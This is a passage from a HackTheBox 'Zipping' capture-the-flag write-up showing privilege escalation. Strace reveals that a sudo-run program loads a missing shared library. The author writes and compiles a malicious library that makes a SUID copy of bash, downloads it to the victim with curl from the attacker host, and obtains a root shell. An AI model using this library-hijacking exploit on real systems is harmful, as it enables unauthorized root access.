It worked, and we gained access to a menu. I want to obtain more information about the <code>stock</code> program. Before starting reverse engineering methods with tools like <code>ghidra</code>, I always use the <code>strace</code> or <code>ltrace</code> program. However, on this machine, only <code>strace</code> is installed.<br/><br/>
<code>strace</code> is a Unix tool that intercepts and records system calls and signals made by a program. It helps trace and debug a program's interaction with the operating system kernel, providing detailed information about system calls, arguments, and results. It is useful for understanding program behavior, diagnosing performance issues, debugging errors, and conducting security analysis.<br/><br/>
I will launch <code>strace</code> specifying the <code>stock</code> program as an argument:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">strace</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">stock</span>
</pre></div>

After entering the password, the <code>strace</code> program reports something interesting:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/zipping/img/18.png"/><br/><br/>
It is attempting to load a shared library from the <code>/home/rektsu/.config/</code> directory. This presents a potential privilege escalation vector. Since we can execute this program as root, we could create a malicious shared library and save it as <code>libcounter.so</code> in the <code>/home/rektsu/.config/</code> directory.<br/><br/>
This will be the code of the malicious library:<br/><br/>
<div class="highlight"><pre><span></span><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span><span class="c1"> </span>


<span class="kt">void</span><span class="w"> </span><span class="nf">exploit</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"> </span><span class="n">__attribute__</span><span class="p">((</span><span class="n">destructor</span><span class="p">));</span><span class="w"> </span>


<span class="kt">void</span><span class="w"> </span><span class="nf">exploit</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>

<span class="w">  </span><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="w">  </span><span class="n">system</span><span class="p">(</span><span class="s">"cp /bin/bash /tmp/elswix"</span><span class="p">);</span>
<span class="w">  </span><span class="n">system</span><span class="p">(</span><span class="s">"chmod u+s /tmp/elswix"</span><span class="p">);</span>
<span class="w">  </span>
<span class="p">}</span>
</pre></div>

In short, the above code will be executed after the program is finished. The <code>setuid()</code> function is not necessary in this case, but it never hurts to use it, especially when dealing with a Set-UID file.<br/><br/>
I will compile it using gcc:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">gcc</span> <span class="n">libcounter</span><span class="o">.</span><span class="n">c</span> <span class="o">-</span><span class="n">fPIC</span> <span class="o">-</span><span class="n">shared</span> <span class="o">-</span><span class="n">o</span> <span class="n">libcounter</span><span class="o">.</span><span class="n">so</span>
<span class="n">libcounter</span><span class="o">.</span><span class="n">c</span><span class="p">:</span> <span class="n">In</span> <span class="n">function</span> <span class="err">‘</span><span class="n">exploit</span><span class="err">’</span><span class="p">:</span>
<span class="n">libcounter</span><span class="o">.</span><span class="n">c</span><span class="p">:</span><span class="mi">9</span><span class="p">:</span><span class="mi">3</span><span class="p">:</span> <span class="n">warning</span><span class="p">:</span> <span class="n">implicit</span> <span class="n">declaration</span> <span class="n">of</span> <span class="n">function</span> <span class="err">‘</span><span class="n">setuid</span><span class="err">’</span> <span class="p">[</span><span class="o">-</span><span class="n">Wimplicit</span><span class="o">-</span><span class="n">function</span><span class="o">-</span><span class="n">declaration</span><span class="p">]</span>
    <span class="mi">9</span> <span class="o">|</span>   <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
      <span class="o">|</span>   <span class="o">^~~~~~</span>
</pre></div>

That's just a warning; there is no problem. Besides, you can remove the function if you wish.<br/><br/>
Now I will upload this file on the victim machine:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="o">.</span><span class="n">server</span> <span class="mi">80</span>
<span class="n">Serving</span> <span class="n">HTTP</span> <span class="n">on</span> <span class="mf">0.0.0.0</span> <span class="n">port</span> <span class="mi">80</span> <span class="p">(</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">80</span><span class="o">/</span><span class="p">)</span> <span class="o">...</span>
</pre></div>

Now, I will download it on the victim machine using <code>curl</code>:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">rektsu@zipping</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">rektsu</span><span class="o">/.</span><span class="n">config</span><span class="err">$</span> <span class="n">curl</span> <span class="mf">10.10.16.5</span><span class="o">/</span><span class="n">libcounter</span><span class="o">.</span><span class="n">so</span> <span class="o">-</span><span class="n">o</span> <span class="n">libcounter</span><span class="o">.</span><span class="n">so</span>
  <span class="o">%</span> <span class="n">Total</span>    <span class="o">%</span> <span class="n">Received</span> <span class="o">%</span> <span class="n">Xferd</span>  <span class="n">Average</span> <span class="n">Speed</span>   <span class="n">Time</span>    <span class="n">Time</span>     <span class="n">Time</span>  <span class="n">Current</span>
                                 <span class="n">Dload</span>  <span class="n">Upload</span>   <span class="n">Total</span>   <span class="n">Spent</span>    <span class="n">Left</span>  <span class="n">Speed</span>
<span class="mi">100</span> <span class="mi">15432</span>  <span class="mi">100</span> <span class="mi">15432</span>    <span class="mi">0</span>     <span class="mi">0</span>  <span class="mi">11370</span>      <span class="mi">0</span>  <span class="mi">0</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">01</span>  <span class="mi">0</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">01</span> <span class="o">--</span><span class="p">:</span><span class="o">--</span><span class="p">:</span><span class="o">--</span> <span class="mi">11405</span>
<span class="nd">rektsu@zipping</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">rektsu</span><span class="o">/.</span><span class="n">config</span><span class="err">$</span>
</pre></div>

Finally, let's execute the <code>stock</code> program using sudo:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">rektsu@zipping</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">rektsu</span><span class="o">/.</span><span class="n">config</span><span class="err">$</span> <span class="n">sudo</span> <span class="n">stock</span>
<span class="n">Enter</span> <span class="n">the</span> <span class="n">password</span><span class="p">:</span> <span class="n">St0ckM4nager</span>

<span class="o">==================</span> <span class="n">Menu</span> <span class="o">==================</span>

<span class="mi">1</span><span class="p">)</span> <span class="n">See</span> <span class="n">the</span> <span class="n">stock</span>
<span class="mi">2</span><span class="p">)</span> <span class="n">Edit</span> <span class="n">the</span> <span class="n">stock</span>
<span class="mi">3</span><span class="p">)</span> <span class="n">Exit</span> <span class="n">the</span> <span class="n">program</span>

<span class="n">Select</span> <span class="n">an</span> <span class="n">option</span><span class="p">:</span> <span class="mi">3</span>
<span class="nd">rektsu@zipping</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">rektsu</span><span class="o">/.</span><span class="n">config</span><span class="err">$</span>
</pre></div>

If everything worked fine, we should see the <code>/tmp/elswix</code> file with the Set-UID bit set (recall that the <code>/tmp/elswix</code> file is a copy of the <code>/bin/bash</code>).<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">rektsu@zipping</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">rektsu</span><span class="o">/.</span><span class="n">config</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="n">tmp</span>
<span class="n">total</span> <span class="mi">1404</span>
<span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">1433736</span> <span class="n">Jan</span> <span class="mi">12</span> <span class="mi">22</span><span class="p">:</span><span class="mi">30</span> <span class="n">elswix</span>
<span class="nd">rektsu@zipping</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">rektsu</span><span class="o">/.</span><span class="n">config</span><span class="err">$</span>
</pre></div>

Great!, now we can gain access as root executing <code>/tmp/elswix -p</code>:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">rektsu@zipping</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">rektsu</span><span class="o">/.</span><span class="n">config</span><span class="err">$</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">elswix</span> <span class="o">-</span><span class="n">p</span>
<span class="n">elswix</span><span class="o">-</span><span class="mf">5.2</span><span class="root1">#</span><span class="n"> whoami</span>
<span class="n">root</span>
<span class="n">elswix</span><span class="o">-</span><span class="mf">5.2</span><span class="root1">#</span><span class="n"></span>
</pre></div>

Finally, we can read <code>root.txt</code>:<br/><br/>
<div class="highlight"><pre><span></span><span class="n">elswix</span><span class="o">-</span><span class="mf">5.2</span><span class="root1">#</span><span class="n"> cd /root</span>
<span class="n">elswix</span><span class="o">-</span><span class="mf">5.2</span><span class="root1">#</span><span class="n"> cat root.txt</span>
<span class="mi">491</span><span class="n">af</span><span class="o">**********************</span><span class="mi">05260</span>
<span class="n">elswix</span><span class="o">-</span><span class="mf">5.2</span><span class="root1">#</span><span class="c1"></span>
</pre></div></br></br></br></br></br></br></br></br>
            </div>
        </div>
    </section>

    <footer>
        <p>&copy; 2024 elswix.github.io</p>
    </footer>
</body>
</html>
